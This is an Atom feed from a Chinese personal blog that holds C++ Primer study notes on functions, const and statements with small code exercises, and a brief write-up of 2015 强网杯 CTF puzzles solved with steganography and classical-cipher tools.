<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>findream&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-11T12:19:01.022Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>findream</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C++Primer 第六章：函数</title>
    <link href="http://yoursite.com/2018/04/11/C++%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2018/04/11/C++第六章_函数/</id>
    <published>2018-04-11T08:02:11.000Z</published>
    <updated>2018-04-11T12:19:01.022Z</updated>
    
    <content type="html"><![CDATA[<h2 id="6-1-函数基础"><a href="#6-1-函数基础" class="headerlink" title="6.1 函数基础"></a>6.1 函数基础</h2><h3 id="6-1-1-局部变量"><a href="#6-1-1-局部变量" class="headerlink" title="6.1.1 局部变量"></a>6.1.1 局部变量</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;static是静态修饰符，static变量存放在静态存储区，本次ret的数据对下次函数调用仍然有效。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i != <span class="number">10</span>; ++i)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; count_calls() &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">size_t</span> count_calls()</div><div class="line">&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">size_t</span> ctr = <span class="number">0</span>;  <span class="comment">//static局部变量的特点是它位于静态存贮区，</span></div><div class="line">                        <span class="comment">//在函数调用结束后，它的值仍然存在，并可能影响到下一次调用的过程。</span></div><div class="line"><span class="keyword">return</span> ++ctr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><pre><code>![](http://oxnvtxe03.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180411194941.png)</code></pre><a id="more"></a><h2 id="6-2-参数传递"><a href="#6-2-参数传递" class="headerlink" title="6.2 参数传递"></a>6.2 参数传递</h2><h3 id="6-2-0"><a href="#6-2-0" class="headerlink" title="6.2.0"></a>6.2.0</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每次函数调用都会创建形参。并使用传入的实参对形式参数进行初始化。</p><h3 id="6-2-1-传值参数"><a href="#6-2-1-传值参数" class="headerlink" title="6.2.1 传值参数"></a>6.2.1 传值参数</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;引用传递：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;拷贝传递，如果利用这种传参方法，不会改变实参的数值。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指针传参：</p><ul><li>练习6.10<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">size_t</span> count_calls();</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i != <span class="number">10</span>; ++i)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; count_calls() &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">size_t</span> count_calls()</div><div class="line">&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">size_t</span> ctr = <span class="number">0</span>;  <span class="comment">//static局部变量的特点是它位于静态存贮区，</span></div><div class="line">                        <span class="comment">//在函数调用结束后，它的值仍然存在，并可能影响到下一次调用的过程。</span></div><div class="line"><span class="keyword">return</span> ++ctr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h3 id="6-2-3-传引用参数"><a href="#6-2-3-传引用参数" class="headerlink" title="6.2.3 传引用参数"></a>6.2.3 传引用参数</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;引用的操作是作用在引用的对象上面的，对于函数来说，如果形势参数是引用的话，对引用的更改就是对绑定在引用的对象的更改。</p><ul><li><p>练习6.11</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> Num;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; Num)</div><div class="line">&#123;</div><div class="line">reset(Num);</div><div class="line"><span class="built_in">cout</span> &lt;&lt; Num &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset</span><span class="params">(<span class="keyword">int</span> &amp;Num)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">Num = <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习6.12</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> Num1, Num2;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; Num1 &gt;&gt; Num2)</div><div class="line">&#123;</div><div class="line">ExchangeNum(Num1, Num2);</div><div class="line"><span class="built_in">cout</span> &lt;&lt; Num1 &lt;&lt; <span class="string">" "</span> &lt;&lt; Num2 &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExchangeNum</span><span class="params">(<span class="keyword">int</span> &amp;Num1, <span class="keyword">int</span> &amp;Num2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> temp;   <span class="comment">//int</span></div><div class="line">temp = Num1;    <span class="comment">//*Num1Ϊint</span></div><div class="line">Num1 = Num2;</div><div class="line">Num2 = temp;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;6-1-函数基础&quot;&gt;&lt;a href=&quot;#6-1-函数基础&quot; class=&quot;headerlink&quot; title=&quot;6.1 函数基础&quot;&gt;&lt;/a&gt;6.1 函数基础&lt;/h2&gt;&lt;h3 id=&quot;6-1-1-局部变量&quot;&gt;&lt;a href=&quot;#6-1-1-局部变量&quot; class=&quot;headerlink&quot; title=&quot;6.1.1 局部变量&quot;&gt;&lt;/a&gt;6.1.1 局部变量&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;static是静态修饰符，static变量存放在静态存储区，本次ret的数据对下次函数调用仍然有效。&lt;br&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i != &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;; ++i)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;cout&lt;/span&gt; &amp;lt;&amp;lt; count_calls() &amp;lt;&amp;lt; &lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	system(&lt;span class=&quot;string&quot;&gt;&quot;pause&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; count_calls()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; ctr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;  &lt;span class=&quot;comment&quot;&gt;//static局部变量的特点是它位于静态存贮区，&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        &lt;span class=&quot;comment&quot;&gt;//在函数调用结束后，它的值仍然存在，并可能影响到下一次调用的过程。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ++ctr;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![](http://oxnvtxe03.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180411194941.png)
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>C++Primer 第二章:变量和基本类型</title>
    <link href="http://yoursite.com/2018/04/11/C++%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%8F%98%E9%87%8F%E5%92%8C%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yoursite.com/2018/04/11/C++第二章_变量和基本类型/</id>
    <published>2018-04-11T07:02:11.000Z</published>
    <updated>2018-04-11T12:18:21.361Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2-4：const限定符"><a href="#2-4：const限定符" class="headerlink" title="2.4：const限定符"></a>2.4：const限定符</h2><h3 id="2-4-0：初始化Const"><a href="#2-4-0：初始化Const" class="headerlink" title="2.4.0：初始化Const"></a>2.4.0：初始化Const</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果需要限制某个变量的值不能被修改，我们应该使用const限定符，const限定符必须要初始化，如下的定义是错误的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> n;    <span class="comment">//错误，因为没有被初始化</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const限定符只能在同一个文件使用有效。在编译过程中，编译器会在任何使用const变量的地方，使用常量代替。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只在一个文件中定义const变量，但是需要在多个文件中使用的，需要关键字extern。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> num=<span class="number">1</span>;</div></pre></td></tr></table></figure></p><a id="more"></a><h3 id="2-4-1-const的引用"><a href="#2-4-1-const的引用" class="headerlink" title="2.4.1:const的引用"></a>2.4.1:const的引用</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>对常量的引用：</strong>可以把引用绑定到const对象上的引用。但是对常量的引用不能修改他所绑定的对象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>对常量的引用可以引用一个非常量的对象。</strong><br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">int</span> i=<span class="number">42</span>;</div><div class="line"><span class="keyword">const</span> <span class="built_in">int</span> &amp;r1=i;      //允许<span class="keyword">const</span> <span class="built_in">int</span>&amp;绑定在<span class="built_in">int</span>变量上</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;引用必须和他引用的对象类型一致。如下就是一个<strong>错误</strong>的实例：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">int</span> i=<span class="number">42</span>;</div><div class="line"><span class="keyword">const</span> <span class="built_in">int</span> &amp;r1=i;      //允许<span class="keyword">const</span> <span class="built_in">int</span>&amp;绑定在<span class="built_in">int</span>变量上</div><div class="line"><span class="built_in">int</span> &amp;r2=r1；          //错误，试图使用非常量引用指向常量对象，这样做缺少了关于引用修改值得意义。</div></pre></td></tr></table></figure></p><h3 id="2-4-2-指针和const"><a href="#2-4-2-指针和const" class="headerlink" title="2.4.2 指针和const"></a>2.4.2 指针和const</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>指向常量的指针：</strong>不能改变其所指对象的值。<strong>如果想要存放常量对象的地址</strong>，必须使用指向常量的指针，<strong><font color="#DC143C">但是指针指向的对象(就是那个地址)可以改变.</font></strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>但是允许指向常量的指针指向一个非常量，这样一来，我们虽然不可以利用执政const指针改变所指向对象的值，但是我们可以通过其他方法改变该对象的值</strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">double</span> pi1 = <span class="number">3.14</span>;    <span class="comment">//pi1是一个常量</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">double</span> *Ppi1=&amp;pi1；   <span class="comment">//允许，是一个指向常量的指针</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const指针，<strong>指针常量必须初始化，一旦初始化，指针的值（也就是指针指向对象的地址）不能更改了。</strong><br><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">int</span> <span class="built_in">num</span>=<span class="number">0</span>;</div><div class="line"><span class="built_in">int</span> *<span class="keyword">const</span> Pnum=&amp;<span class="built_in">num</span>;  <span class="comment">//Pnum是常量指针，一直指向的是num。</span></div><div class="line"><span class="keyword">const</span> <span class="built_in">double</span> pi=<span class="number">3.14</span>;   <span class="comment">//常量</span></div><div class="line"><span class="keyword">const</span> <span class="built_in">double</span> *<span class="keyword">const</span> Ppi=&amp;pi;  <span class="comment">//指向常量的常量指针。第一个const是修饰的对象，第二份const修饰的是指针。</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于常量指针，还是指向常量的指针，阅读顺序是从左向右阅读<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">int</span>  i;</div><div class="line"><span class="keyword">const</span> <span class="built_in">int</span> x=<span class="number">1</span>;</div><div class="line"><span class="built_in">int</span> *<span class="keyword">const</span> p=&amp;i;   //常量指针，指向对象是一个<span class="built_in">int</span>变量</div><div class="line"><span class="keyword">const</span> <span class="built_in">int</span> *q=&amp;x；  //指针，指向的是<span class="keyword">const</span> <span class="built_in">int</span> 类型的常量</div></pre></td></tr></table></figure></p><h3 id="2-4-3-顶层const"><a href="#2-4-3-顶层const" class="headerlink" title="2.4.3 顶层const"></a>2.4.3 顶层const</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>顶层const：</strong>指针本身就是一个常量，也就是指向的地址不能更改。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>底层const:</strong>指针指向的对象是一个常量。</p><h3 id="2-4-4constexpr和常量表达式"><a href="#2-4-4constexpr和常量表达式" class="headerlink" title="2.4.4constexpr和常量表达式"></a>2.4.4constexpr和常量表达式</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常量表达式是指值不会改变并且只有在编译过程中就能得到计算结果了。const是指在程序运行过程中，不能修改值。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;constexpr用于检测常量表达式。constexpr修饰的指针。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p=<span class="literal">nullptr</span>;     <span class="comment">//是一个指向int常量的指针</span></div><div class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> *p=<span class="literal">nullptr</span>    <span class="comment">//是一个指向整数的常量指针。顶层const</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;2-4：const限定符&quot;&gt;&lt;a href=&quot;#2-4：const限定符&quot; class=&quot;headerlink&quot; title=&quot;2.4：const限定符&quot;&gt;&lt;/a&gt;2.4：const限定符&lt;/h2&gt;&lt;h3 id=&quot;2-4-0：初始化Const&quot;&gt;&lt;a href=&quot;#2-4-0：初始化Const&quot; class=&quot;headerlink&quot; title=&quot;2.4.0：初始化Const&quot;&gt;&lt;/a&gt;2.4.0：初始化Const&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;如果需要限制某个变量的值不能被修改，我们应该使用const限定符，const限定符必须要初始化，如下的定义是错误的。&lt;br&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n;    &lt;span class=&quot;comment&quot;&gt;//错误，因为没有被初始化&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;const限定符只能在同一个文件使用有效。在编译过程中，编译器会在任何使用const变量的地方，使用常量代替。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;只在一个文件中定义const变量，但是需要在多个文件中使用的，需要关键字extern。&lt;br&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; num=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>2015年强网杯MISC和REV</title>
    <link href="http://yoursite.com/2018/04/09/2015%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <id>http://yoursite.com/2018/04/09/2015年强网杯/</id>
    <published>2018-04-09T03:00:11.000Z</published>
    <updated>2018-04-09T05:33:34.829Z</updated>
    
    <content type="html"><![CDATA[<h2 id="来看一下flag格式-BASIC"><a href="#来看一下flag格式-BASIC" class="headerlink" title="来看一下flag格式[BASIC]"></a>来看一下flag格式[BASIC]</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;签到题，不做解释。<br><a id="more"></a></p><h2 id="小苹果-BASIC"><a href="#小苹果-BASIC" class="headerlink" title="小苹果[BASIC]"></a>小苹果[BASIC]</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;听了音乐，发现这里面没有出现杂音，排除了关于摩尔斯电码的可能性。波形杂乱无序，见图1，排除了关于波形的可能性。存在LSB的可能性，不仅仅图片隐写存在LSB技术，在音频中也存在。利用<strong>SilentEye</strong>这个软件解密即可。<br>      <img src="https://i.imgur.com/Ccip6pB.png" alt=""><br>      <img src="https://i.imgur.com/RXuu5d2.png" alt=""></p><h2 id="致敬经典"><a href="#致敬经典" class="headerlink" title="致敬经典"></a>致敬经典</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;放到百度识图上去，发现是恺撒大帝，恺撒密码，但是解密结果不正确，通过查看wp发现这是变种的恺撒密码。如果是奇数的话右移6位，如果是偶数则左移6位。<br>    <img src="https://i.imgur.com/mUjFvGF.jpg" alt=""></p><h2 id="回旋13踢"><a href="#回旋13踢" class="headerlink" title="回旋13踢"></a>回旋13踢</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没有改变flag的类型，主要没有改变括号，只可能是恺撒密码，解密即可。</p><h2 id="爆破？"><a href="#爆破？" class="headerlink" title="爆破？"></a>爆破？</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;既有txt又有zip，不解释首选明文破解。将里面的readme.txt压缩一下，利用AZPR来解密</p><h2 id="小心猪圈"><a href="#小心猪圈" class="headerlink" title="小心猪圈"></a>小心猪圈</h2><ul><li>一看字母+数字，首先想到的是base64解密<br>  <img src="https://i.imgur.com/mmlXlmS.png" alt=""></li><li>这一堆是ASCII编码，<br>  <img src="https://i.imgur.com/GpLlLSk.png" alt=""></li><li>存在=，想到base64，但是解密是乱码，在加一个等号也不行。试试base2<br>  <img src="https://i.imgur.com/hvPsvST.png" alt=""><br>  <img src="https://i.imgur.com/gnDEviO.png" alt=""></li><li>最后发现两个等号，base64解密<br>  <img src="https://i.imgur.com/Uep0THU.png" alt=""></li><li>最后放到猪圈密码解密工具里面解密就行了<br>  <img src="https://i.imgur.com/Y2OSuBJ.png" alt=""><h2 id="单身狗"><a href="#单身狗" class="headerlink" title="单身狗"></a>单身狗</h2></li><li>截取正常的一小块，利用ppt拼好，然后扫扫就行了<br>  <img src="https://i.imgur.com/NDCEMHv.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;来看一下flag格式-BASIC&quot;&gt;&lt;a href=&quot;#来看一下flag格式-BASIC&quot; class=&quot;headerlink&quot; title=&quot;来看一下flag格式[BASIC]&quot;&gt;&lt;/a&gt;来看一下flag格式[BASIC]&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;签到题，不做解释。&lt;br&gt;
    
    </summary>
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>C++Primer 第五章：语句</title>
    <link href="http://yoursite.com/2018/04/08/C++%E7%AC%AC%E4%BA%94%E7%AB%A0_%E8%AF%AD%E5%8F%A5/"/>
    <id>http://yoursite.com/2018/04/08/C++第五章_语句/</id>
    <published>2018-04-08T07:02:11.000Z</published>
    <updated>2018-04-09T04:47:48.059Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>例5.16：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; VectNum1 = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; VectNum2 = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</div><div class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> SmallSize = (VectNum1.size() &gt; VectNum2.size() ? VectNum2.size() : VectNum1.size());</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != SmallSize; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> 